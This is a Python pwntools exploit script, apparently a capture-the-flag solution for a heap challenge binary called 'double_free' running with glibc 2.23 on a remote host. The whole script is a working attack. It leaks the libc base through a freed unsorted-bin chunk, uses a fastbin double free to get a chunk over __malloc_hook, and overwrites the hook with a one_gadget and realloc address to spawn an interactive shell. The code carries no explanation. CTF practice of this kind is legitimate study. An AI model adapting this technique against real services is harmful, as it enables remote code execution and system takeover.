from pwn import *

# context.log_level = logging.DEBUG
sh = remote("192.168.170.128", 9999)
# sh = process('./double_free')

libc = ELF('./libc-2.23.so')

def alloc(size, content):
    sh.recvuntil(b'choice\n')
    sh.sendline(b'1')
    sh.recvuntil(b'size\n')
    sh.sendline(f'{size}'.encode('utf-8'))
    sh.recvuntil(b'content\n')
    sh.sendline(content)


def delete(id):
    sh.recvuntil(b'choice\n')
    sh.sendline(b'2')
    sh.recvuntil(b'idx\n')
    sh.sendline(f'{id}'.encode('utf-8'))

def show(id):
    sh.recvuntil(b'choice\n')
    sh.sendline(b'3')
    sh.recvuntil(b'idx\n')
    sh.sendline(f'{id}'.encode('utf-8'))


# leak libc base
alloc(0x100, b'1' * 0x100)  #0
# 防止 unsorted 的那个chunk 和 top chunk 紧邻
alloc(1, b'1') #1
delete(0)
show(0)

r = sh.recvline(keepends=False).ljust(8, b'\x00')
libc_addr = u64(r) - 3951480
print('hhhhhhhhhhhhhhhhhhhhhhh:',hex(libc_addr))


__malloc_hook = libc.symbols['__malloc_hook'] + libc_addr
realloc = libc.symbols['realloc'] + libc_addr
ogg = 0x4527a + libc_addr
evil_chunk = __malloc_hook - 0x23

# double free
alloc(0x60, b'1') # 2
alloc(0x60, b'1') # 3

delete(2)
delete(3)
delete(2)


alloc(0x60, p64(evil_chunk)) # 4
alloc(0x60, b'1') # 5
alloc(0x60, p64(evil_chunk)) # 6
alloc(0x60, b'a' * 0x8 + b'a' * 0x3 + p64(ogg) + p64(realloc + 0xc)) # 6
# gdb.attach(sh, f'b *{hex(ogg)}')
# pause()
sh.recvuntil(b'choice\n')
sh.sendline(b'1')
sh.recvuntil(b'size\n')
sh.sendline(f'{0x60}'.encode('utf-8'))
sh.interactive()